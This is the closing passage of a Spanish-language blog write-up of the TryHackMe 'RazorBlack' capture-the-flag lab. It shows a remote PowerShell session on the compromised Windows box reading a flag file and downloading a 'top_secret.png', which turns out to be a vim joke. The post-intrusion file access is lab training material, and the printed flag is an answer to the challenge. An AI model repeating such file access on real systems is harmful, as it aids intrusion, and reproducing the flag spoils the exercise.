d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe  

PS C:\Users\twilliams> type def*
THM{5144f2c4107b7cab04916724e3749fb0}
PS C:\Users\twilliams></span>
</code></pre></div></div><br>

<p class="plain-text">Tambien en el directorio <code class="language-plaintext highlighter-rouge">Program Files</code> tenemos dentro un directorio con el nombre <code class="language-plaintext highlighter-rouge">Top Secret</code> que dentro contiene solo un archivo de <code class="language-plaintext highlighter-rouge">imagen</code> con extensión <code class="language-plaintext highlighter-rouge">png</code></pp>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Program Files\Top Secret> </span><span class="am">dir</span><span class="p">

    Directory: C:\Program Files\Top Secret

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/25/2021  10:13 AM         449195 top_secret.png

PS C:\Program Files\Top Secret> </span><span class="am">download </span><span class="p">top_secret.png
</span><span class="az">
Info: Downloading C:\Program Files\Top Secret\top_secret.png to top_secret.png  

Info: Download successful!
</span><span class="p">
PS C:\Program Files\Top Secret></span>
</code></pre></div></div><br>

<p class="plain-text">La imágen es solo una <code class="language-plaintext highlighter-rouge">referencia</code> con humor a un problema comun en principiantes que es como salir de <code class="language-plaintext highlighter-rouge">vim</code>, la respuesta a esto y el secreto es simplemente <code class="language-plaintext highlighter-rouge">:wq</code></p>
<a href="/tryhackme/razorblack/top_secret.png" target="_blank"><div><p><img src="/tryhackme/razorblack/top_secret.png"></p></div></a>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
